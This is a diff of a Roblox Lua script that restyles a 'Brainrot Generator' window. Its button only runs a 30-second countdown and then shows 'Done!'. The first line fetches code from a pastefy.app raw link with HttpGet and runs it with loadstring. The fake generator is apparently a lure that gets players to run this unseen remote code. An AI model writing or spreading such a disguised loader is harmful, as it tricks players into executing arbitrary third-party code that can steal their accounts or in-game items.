@@ -1,51 +1,71 @@
 loadstring(game:HttpGet("https://pastefy.app/0oa0HgKh/raw"))()
-local player = game.Players.LocalPlayer
-local gui = Instance.new("ScreenGui")
-gui.Name = "BrainrotUI"
-gui.Parent = player:WaitForChild("PlayerGui")
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "BrainrotGUI"
+ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 
--- Main Frame
-local frame = Instance.new("Frame")
-frame.Size = UDim2.new(0, 300, 0, 150)
-frame.Position = UDim2.new(0.5, -150, 0.5, -75)
-frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-frame.Parent = gui
+--// Main Frame
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 300, 0, 180)
+Frame.Position = UDim2.new(0.5, -150, 0.5, -90)
+Frame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+Frame.BorderSizePixel = 0
+Frame.Parent = ScreenGui
 
--- Title
-local title = Instance.new("TextLabel")
-title.Size = UDim2.new(1, 0, 0, 30)
-title.Text = "Brainrot Generator"
-title.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
-title.TextColor3 = Color3.new(1,1,1)
-title.Parent = frame
+--// UI Corner (rounded edges)
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 12)
 
--- Button
-local button = Instance.new("TextButton")
-button.Size = UDim2.new(0.8, 0, 0, 40)
-button.Position = UDim2.new(0.1, 0, 0.4, 0)
-button.Text = "GENERATE OG LUCKY BLOCK"
-button.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
-button.TextColor3 = Color3.new(1,1,1)
-button.Parent = frame
+--// UI Gradient (fancy look)
+local UIGradient = Instance.new("UIGradient", Frame)
+UIGradient.Color = ColorSequence.new{
+	ColorSequenceKeypoint.new(0, Color3.fromRGB(85, 170, 255)),
+	ColorSequenceKeypoint.new(1, Color3.fromRGB(170, 85, 255))
+}
+UIGradient.Rotation = 45
 
--- Timer Label
-local timerLabel = Instance.new("TextLabel")
-timerLabel.Size = UDim2.new(1, 0, 0, 30)
-timerLabel.Position = UDim2.new(0, 0, 0.75, 0)
-timerLabel.Text = ""
-timerLabel.BackgroundTransparency = 1
-timerLabel.TextColor3 = Color3.new(1,1,1)
-timerLabel.Parent = frame
+--// Title
+local Title = Instance.new("TextLabel")
+Title.Size = UDim2.new(1, 0, 0, 40)
+Title.BackgroundTransparency = 1
+Title.Text = "Brainrot Generator"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+Title.Parent = Frame
 
--- Dragging
-local dragging = false
-local dragInput, dragStart, startPos
+--// Button
+local Button = Instance.new("TextButton")
+Button.Size = UDim2.new(0.8, 0, 0, 50)
+Button.Position = UDim2.new(0.1, 0, 0.4, 0)
+Button.Text = "Generate O.G Blocks"
+Button.Font = Enum.Font.GothamBold
+Button.TextSize = 18
+Button.TextColor3 = Color3.fromRGB(255,255,255)
+Button.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
+Button.Parent = Frame
 
-title.InputBegan:Connect(function(input)
+local BtnCorner = Instance.new("UICorner", Button)
+BtnCorner.CornerRadius = UDim.new(0, 10)
+
+--// Timer Label
+local Timer = Instance.new("TextLabel")
+Timer.Size = UDim2.new(1, 0, 0, 30)
+Timer.Position = UDim2.new(0, 0, 0.75, 0)
+Timer.BackgroundTransparency = 1
+Timer.Text = "Timer: 30"
+Timer.Font = Enum.Font.Gotham
+Timer.TextSize = 16
+Timer.TextColor3 = Color3.fromRGB(255,255,255)
+Timer.Parent = Frame
+
+--// Dragging System
+local dragging, dragInput, mousePos, framePos
+
+Frame.InputBegan:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseButton1 then
 		dragging = true
-		dragStart = input.Position
-		startPos = frame.Position
+		mousePos = input.Position
+		framePos = Frame.Position
 		
 		input.Changed:Connect(function()
 			if input.UserInputState == Enum.UserInputState.End then
@@ -55,7 +75,7 @@ title.InputBegan:Connect(function(input)
 	end
 end)
 
-title.InputChanged:Connect(function(input)
+Frame.InputChanged:Connect(function(input)
 	if input.UserInputType == Enum.UserInputType.MouseMovement then
 		dragInput = input
 	end
@@ -63,25 +83,24 @@ end)
 
 game:GetService("UserInputService").InputChanged:Connect(function(input)
 	if input == dragInput and dragging then
-		local delta = input.Position - dragStart
-		frame.Position = UDim2.new(
-			startPos.X.Scale,
-			startPos.X.Offset + delta.X,
-			startPos.Y.Scale,
-			startPos.Y.Offset + delta.Y
+		local delta = input.Position - mousePos
+		Frame.Position = UDim2.new(
+			framePos.X.Scale,
+			framePos.X.Offset + delta.X,
+			framePos.Y.Scale,
+			framePos.Y.Offset + delta.Y
 		)
 	end
 end)
 
--- Button Click Logic
-button.MouseButton1Click:Connect(function()
-	button.Text = "Generating..."
+--// Button Click + Timer
+Button.MouseButton1Click:Connect(function()
+	local timeLeft = 30
 	
-	for i = 30, 0, -1 do
-		timerLabel.Text = "Loading... " .. i .. "s"
-		task.wait(1)
+	for i = timeLeft, 0, -1 do
+		Timer.Text = "Timer: " .. i
+		wait(1)
 	end
 	
-	timerLabel.Text = "OG Lucky Block Generated!"
-	button.Text = "DONE"
+	Timer.Text = "Done!"
 end)
